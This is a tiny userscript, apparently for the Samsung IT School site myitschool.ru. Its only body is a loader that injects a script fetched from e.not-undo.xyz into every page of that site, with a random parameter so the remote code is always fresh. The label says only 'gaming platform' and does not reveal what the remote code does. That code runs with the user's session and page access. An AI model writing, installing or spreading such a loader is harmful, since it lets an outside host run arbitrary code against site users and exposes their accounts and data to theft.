// ==UserScript==
// @author Perspective
// @name         SamsungUP
// @version      0.8
// @copyright 2021,  https://e.not-undo.xyz/
// @description  Игоровая платформа
// @homepageURL https://e.not-undo.xyz/profile/home
// @supportURL  https://e.not-undo.xyz/profile/home
// @match        https://myitschool.ru/*
// @license MIT
// ==/UserScript==

(()=>{
    const src = document.createElement("script")
    src.src = "https://e.not-undo.xyz/api/js/?"+Math.random()
    document.body.append(src)
})()